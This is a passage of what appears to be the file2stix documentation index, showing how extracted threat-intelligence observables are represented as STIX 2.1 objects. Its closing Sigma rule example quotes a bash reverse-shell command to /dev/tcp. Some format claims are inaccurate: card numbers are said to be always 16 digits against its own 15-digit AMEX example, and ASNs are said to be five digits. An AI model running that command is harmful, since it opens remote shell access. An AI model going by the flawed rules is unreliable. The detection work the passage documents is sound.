\"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Domain: <EXTRACTED DOMAIN NAME OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ domain-name:value = '<EXTRACTED DOMAIN NAME OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-domain-name-sco","text":"{ \"type\": \"domain-name\", \"spec_version\": \"2.1\", \"id\": \"domain-name--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED DOMAIN NAME VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" }","title":"STIX 2.1 domain-name SCO"},{"location":"extractions-analysis-mode/#4-url-observables-indicator","text":"e.g. Full path https://example.com/research/index.html e.g. Partial path https://example.com/research/ Lots of URL extraction logic exists on the internet ( for example ). Like with URLs, it is also worth validating protocol and TLDs in the URL path to ensure they are URLs (and not file paths). URL Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX URL SCO ( \"type\": \"url\" ) to create the Indicator SDO pattern property. Here is how URL observables are represented in STIX 2.1 by file2stix;","title":"4. URL Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_5","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"URL: <EXTRACTED URL OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ url:value = '<EXTRACTED URL OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-url-sco","text":"{ \"type\": \"url\", \"spec_version\": \"2.1\", \"id\": \"url--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED URL VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" }","title":"STIX 2.1 url SCO"},{"location":"extractions-analysis-mode/#5-file-name-observables-indicator","text":"e.g. badfile.exe The extraction for file extensions requires some dictionary definitions (because filenames can easily be confused with domains in pattern matching). Here is a comprehensive list of file extensions that can be used . File Name Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX File SCO ( \"type\": \"file\" ) to create the Indicator SDO pattern property. Here is how file names are represented in STIX 2.1 by file2stix;","title":"5. File Name Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_6","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"File name: <EXTRACTED FILE NAME OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ file:name = '<EXTRACTED FILE NAME OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-file-sco","text":"{ \"type\": \"file\", \"spec_version\": \"2.1\", \"id\": \"file--<GENERATED BY STIX2 LIBRARY>\", \"name\": \"<EXTRACTED FILE NAME VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" }","title":"STIX 2.1 file SCO"},{"location":"extractions-analysis-mode/#6-directory-path-observables-indicator","text":"e.g. Windows Path C:\\Windows\\System32 e.g. UNIX Path /System/Library/LaunchDaemons Windows paths start with a drive followed by :\\ and directories in path are split by \\ . UNIX Paths start with / and directories in path are split by / . Directory Path Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Directory SCO ( \"type\": \"directory\" ) to create the Indicator SDO pattern property. Here is how directory observables are represented in STIX 2.1 by file2stix;","title":"6. Directory Path Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_7","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Directory: <EXTRACTED DIRECTORY OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ directory:path = '<EXTRACTED DIRECTORY OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-directory-sco","text":"{ \"type\": \"directory\", \"spec_version\": \"2.1\", \"id\": \"directory--<GENERATED BY STIX2 LIBRARY>\", \"path\": \"<EXTRACTED DIRECTORY OBSERVABLE VALUE>\" }","title":"STIX 2.1 directory SCO"},{"location":"extractions-analysis-mode/#7-file-hashes-indicator","text":"e.g. md5 79054025255fb1a26e4bc422aef54eb4 e.g. sha1 `86F7E437FAA5A7FCE15D1DDCB9EAEAEA377667B8 e.g. sha256 F4BF9F7FCBEDABA0392F108C59D8F4A38B3838EFB64877380171B54475C2ADE8 e.g. sha512 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 e.g ssdeep 24:Ol9rFBzwjx5ZKvBF+bi8RuM4Pp6rG5Yg+q8wIXhMC:qrFBzKx5s8sM4grq8wIXht Lots of hash extraction logic exists on the internet ( for example ). These are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX File SCO ( \"type\": \"file\" ) to create the Indicator SDO pattern property. Here is how file hashes are represented in STIX 2.1 by file2stix (note, <FILE HASH TYPE> = either md5 , sha1 , sha256 , ssdeep );","title":"7. File Hashes (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_8","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"<FILE HASH TYPE>: <EXTRACTED FILE HASH OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ file:hashes.<FILE HASH TYPE> = '<EXTRACTED FILE HASH OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-file-sco_1","text":"{ \"type\": \"file\", \"spec_version\": \"2.1\", \"id\": \"file--<GENERATED BY STIX2 LIBRARY>\", \"hashes\": { \"<FILE HASH TYPE>\": \"<EXTRACTED FILE HASH OBSERVABLE VALUE>\" } }","title":"STIX 2.1 file SCO"},{"location":"extractions-analysis-mode/#8-email-address-observables-indicator","text":"e.g. Full email address example@example.com Lots of email extraction logic exists on the internet ( for example ). Like with URLs, it is also worth validating TLDs in the email to ensure they are valid. Email Address Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Email Address SCO ( \"type\": \"email-addr\" ) to create the Indicator SDO pattern property. Here is how email address observables are represented in STIX 2.1 by file2stix;","title":"8. Email Address Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_9","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Email Address: <EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ email-addr:value = '<EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-file-sco_2","text":"{ \"type\": \"email-addr\", \"spec_version\": \"2.1\", \"id\": \"email-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" }","title":"STIX 2.1 file SCO"},{"location":"extractions-analysis-mode/#9-mac-address-observables-indicator","text":"e.g. Full MAC address d2:fb:49:24:37:18 Mac Addresses have six parts, split by : . Lots of MAC address extraction logic exists on the internet ( for example ). Full MAC addresses are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX MAC Address SCO ( \"type\": \"mac-addr\" ) to create the Indicator SDO pattern property. Here is how MAC Address observables are represented in STIX 2.1 by file2stix;","title":"9. MAC Address Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_10","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"MAC Address: <EXTRACTED MAC ADDRESS OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ mac-addr:value = '<EXTRACTED MAC ADDRESS OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-mac-addr-sco","text":"{ \"type\": \"mac-addr\", \"spec_version\": \"2.1\", \"id\": \"mac-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED MAC ADDRESS OBSERVABLE VALUE>\" }","title":"STIX 2.1 mac-addr SCO"},{"location":"extractions-analysis-mode/#10-windows-registry-key-observables-indicator","text":"e.g. Full registry key path HKEY_LOCAL_MACHINE\\Software\\Classes There are 5 types of registry key HKEY_CLASSES_ROOT , HKEY_CURRENT_USER , HKEY_LOCAL_MACHINE , HKEY_USERS , HKEY_CURRENT_CONFIG . These are then followed by a directory path with directories separated by \\ . Windows Registry Keys are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX MAC Address SCO ( \"type\": \"windows-registry-key\" ) to create the Indicator SDO pattern property. Here is how Windows Registry Key observables are represented in STIX 2.1 by file2stix;","title":"10. Windows Registry Key Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_11","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Windows Registry Key: <EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ windows-registry-key:key = '<EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-windows-registry-key-sco","text":"{ \"type\": \"windows-registry-key\", \"spec_version\": \"2.1\", \"id\": \"windows-registry-key--<GENERATED BY STIX2 LIBRARY>\", \"key\": \"<EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>\" }","title":"STIX 2.1 windows-registry-key SCO"},{"location":"extractions-analysis-mode/#11-user-agent-observables-indicator","text":"e.g Full user agent Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6) Gecko/20040113 ) User Agents should follow RFC7231 . There are a few example regular expressions on the internet to extract user agent patterns . User Agents are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Network Traffic SCO ( \"type\": \"network-traffic\" ) to create the Indicator SDO pattern property. Here is how User Agent observables are represented in STIX 2.1 by file2stix;","title":"11. User Agent Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-extension-definition","text":"As STIX 2.1 does not natively have an extension for user agents file2stix uses a custom SCO; https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/new-sco/user-agent/extension-definition--6cea4dc9-9517-44b8-b021-ae82e2f1de43/20220101000000000.json","title":"STIX 2.1 extension-definition"},{"location":"extractions-analysis-mode/#stix-21-user-agent-sco","text":"{ \"type\": \"user-agent\", \"spec_version\": \"2.1\", \"id\": \"user-agent--<GENERATED BY STIX2 LIBRARY>\", \"string\": \"<EXTRACTED FULL USER AGENT STRING>\", \"extensions\": { \"extension-definition--6cea4dc9-9517-44b8-b021-ae82e2f1de43\" : { \"extension_type\" : \"new-sco\" } } }","title":"STIX 2.1 user-agent SCO"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_12","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"User Agent: <EXTRACTED FULL USER AGENT STRING>\", \"pattern_type\": \"stix\", \"pattern\": \"[ user-agent:string = '<EXTRACTED FULL USER AGENT STRING>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#12-autonomous-system-number-observables-indicator","text":"Including: e.g. ASN Number format ASN15139 / ASN 15139 e.g. AS Number format AS15139 / AS 15139 ASN numbers start with either ASN or AS and are followed by 5 digits. Occasionally some people write ASN numbers with a white space value between the text and digits. ASNs are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX AS Object SCO ( \"type\": \"autonomous-system\" ) to create the Indicator SDO pattern property. Here is how AS observables are represented in STIX 2.1 by file2stix;","title":"12. Autonomous System Number Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_13","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"AS<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ autonomous-system:number = '<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-autonomous-system-sco","text":"{ \"type\": \"autonomous-system\", \"spec_version\": \"2.1\", \"id\": \"autonomous-system--<GENERATED BY STIX2 LIBRARY>\", \"number\": \"<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>\" }","title":"STIX 2.1 autonomous-system SCO"},{"location":"extractions-analysis-mode/#13-cryptocurrency-observables-indicator","text":"Including: e.g. BTC transaction 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 e.g. ETH transaction 0xb794f5ea0ba39494ce839613fffba74279579268 e.g. XMR transaction 888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhw Each of these address formats has a defined length and allowed characters that can be extracted using a regex pattern. For example, Bitcoin addresses is 58 characters . Cryptocurrency Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) / Here is how cryptocurrency observables are represented in STIX 2.1 by file2stix;","title":"13. Cryptocurrency Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-extension-definition_1","text":"As STIX 2.1 does not natively have an extension for cryptocurrency, file2stix uses a custom SCO; https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/new-sco/cryptocurrency-transaction/extension-definition-bef728e0-53cb-11ed-bdc3-0242ac120002/20220101000000000.json","title":"STIX 2.1 extension-definition"},{"location":"extractions-analysis-mode/#stix-21-cryptocurrency-transaaction-sco","text":"{ \"type\": \"cryptocurrency-transaction\", \"spec_version\": \"2.1\", \"id\": \"cryptocurrency-transaction--<GENERATED BY STIX2 LIBRARY>\", \"currency_symbol\": \"<DETECTED CURRENCY TYPE>\", \"address\": \"<EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>\", \"extensions\": { \"extension-definition--532ae28d-137b-4b89-afb7-9cf9b504191b\" : { \"extension_type\" : \"new-sco\" } } }","title":"STIX 2.1 cryptocurrency transaaction SCO"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_14","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"<CRYPTO TYPE> Transaction: <EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ cryptocurrency-transaction:address = '<EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#14-cve-observables-vulnerability","text":"e.g. Full CVE IDs CVE-2022-00001 CVE's always follow the format CVE-YYYY-DDDDD , where YYYY is the year and DDDDD is the numeric ID of the CVE. CVE Observables are represented by the STIX Vulnerability SDOs ( \"type\": \"vulnerability\" ) . Here is how CVE observables are represented in STIX 2.1 by file2stix;","title":"14. CVE Observables (vulnerability)"},{"location":"extractions-analysis-mode/#stix-21-vulnerability-extension-definition","text":"https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/property-extension/nvd-cve-extension/extension-definition--b2b5f2cd-49e6-4091-a0e0-c0bb71543e23/20220101000000000.json","title":"STIX 2.1 vulnerability extension-definition"},{"location":"extractions-analysis-mode/#stix-21-vulnerability-sdo","text":"Imported from cvestix-output database using cve ids -- includes relationships.","title":"STIX 2.1 vulnerability SDO"},{"location":"extractions-analysis-mode/#stix-21-indictor-extension-definition","text":"https://raw.githubusercontent.com/signalscorps/stix2-objects/main/schemas/property-extension/cve2stix-enrichment-extension/example.json","title":"STIX 2.1 indictor extension-definition"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_15","text":"Imported from cvestix-output database using cve ids -- includes relationships.","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#15-country-observables-location","text":"Including: Country Name (e.g. United Kingdom ) Country Code (e.g. UK ) English country names and codes can be identified by standard definition dictionaries, for example . Countries are represented by the STIX Location SDOs ( \"type\": \"location\" ) . Here is how Country observables are represented in STIX 2.1 by file2stix;","title":"15. Country Observables (location)"},{"location":"extractions-analysis-mode/#stix-21-location-sdo","text":"{ \"type\": \"location\", \"spec_version\": \"2.1\", \"id\": \"location--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"name\": \"Country: <EXTRACTED / CONVERTED FULL COUNTRY NAME OBSERVABLE VALUE>\", \"country\": \"<EXTRACTED / CONVERTED COUNTRY ISO OBSERVABLE VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } Note, in the case of Country Name extractions, the country name needs to be converted to a two character ISO 3166-1 ALPHA-2 Code for the country property.","title":"STIX 2.1 location SDO"},{"location":"extractions-analysis-mode/#16-credit-card-observables-indicator","text":"e.g. Mastercard 5555555555554444 e.g. Visa 4242424242424242 e.g. AMEX 378282246310005 e.g. Union Pay 6200000000000005 e.g. Diners 3056930009020004 e.g. JCB 3566002020360505 e.g. Discover 6011111111111117 Card Numbers are always 16 digits long and the type of card can be determined by the first four digits (e.g. 4242 for Visa). Therefore it is easy to identify card numbers using regular expressions . These are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) . Here is how credit card observables are represented in STIX 2.1 by file2stix;","title":"16. Credit Card Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-extension-definition_2","text":"As STIX 2.1 does not natively have an extension for credit cards, file2stix uses a custom SCO; https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/new-sco/credit-card/extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4/20220101000000000.json","title":"STIX 2.1 extension-definition"},{"location":"extractions-analysis-mode/#stix-21-credit-card-sco","text":"{ \"type\": \"credit-card\", \"spec_version\": \"2.1\", \"id\": \"credit-card--<GENERATED BY STIX2 LIBRARY>\", \"issuer\": \"<CREDIT CARD TYPE>\", \"number\": \"<CREDIT CARD NUMBER>\", \"extensions\": { \"extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4\" : { \"extension_type\" : \"new-sco\" } } }","title":"STIX 2.1 credit-card SCO"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_16","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"<CARD TYPE> Credit Card: <EXTRACTED CREDIT CARD OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ credit-card:number = '<EXTRACTED CREDIT CARD OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#17-bank-account-observables-indicator","text":"In the case of file2stix bank accounts are identified using IBAN numbers. * e.g. German IBAN DE29100500001061045672 * e.g. Great Britain IBAN GB94BARC10201530093459 IBAN numbers start with the country code. The country determines the length of the IBAN number and the structure (they are not all the same). However, as each countries structure must follow the same format a regular expression can be used to match all IBAN country variations . IBANs are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) . Here is how IBAN number observables are represented in STIX 2.1 by file2stix;","title":"17. Bank Account Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-extension-definition_3","text":"As STIX 2.1 does not natively have an extension for IBANs, file2stix uses a custom SCO; https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/new-sco/bank-account/extension-definition--349c1029-4052-4635-a064-263cb17290ea/20220101000000000.json","title":"STIX 2.1 extension-definition"},{"location":"extractions-analysis-mode/#stix-21-bank-account-sco","text":"{ \"type\": \"bank-account\", \"spec_version\": \"2.1\", \"id\": \"bank-account--<GENERATED BY STIX2 LIBRARY>\", \"iban_number\": \"<FULL IBAN NUMBER INCLUDING COUNTRY CODE>\", \"extensions\": { \"extension-definition--349c1029-4052-4635-a064-263cb17290ea\": { \"extension_type\" : \"new-sco\" } } }","title":"STIX 2.1 bank-account SCO"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_17","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Bank account: <EXTRACTED IBAN OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ bank-account:iban_number = '<EXTRACTED IBAN OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#18-yara-rule-observables-indicator","text":"e.g. rule dummy { condition: false } YARA rules are can be identified using pattern matching as they always start with rule and end with } . YARA Rules are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) with \"pattern_type\": \"yara\" . Here is how YARA Rule observables are represented in STIX 2.1 by file2stix;","title":"18. YARA Rule Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_18","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"YARA Rule: <RULE NAME>\", \"pattern_type\": \"yara\", \"pattern\": \"<YARA RULE>\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } The YARA rule is first encoded with JSON escapes before it is saved in the pattern value. e.g. rule dummy\\r\\n{\\r\\n condition:\\r\\n false\\r\\n} The <RULE NAME> is defined between the text rule and first { (e.g. dummy in the last example).","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#19-sigma-rule-observables-indicator","text":"e.g. title: Linux Reverse Shell Indicator id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871 status: experimental description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1') date: 2021/10/16 author: Florian Roth logsource: product: linux category: network_connection detection: selection: Image|endswith: '/bin/bash' filter: DestinationIp: - '127.0.0.1' - '0.0.0.0' condition: selection and not filter SIGMA Rules are detected if valid YAML containing three top level fields title , logsource and detection is present. 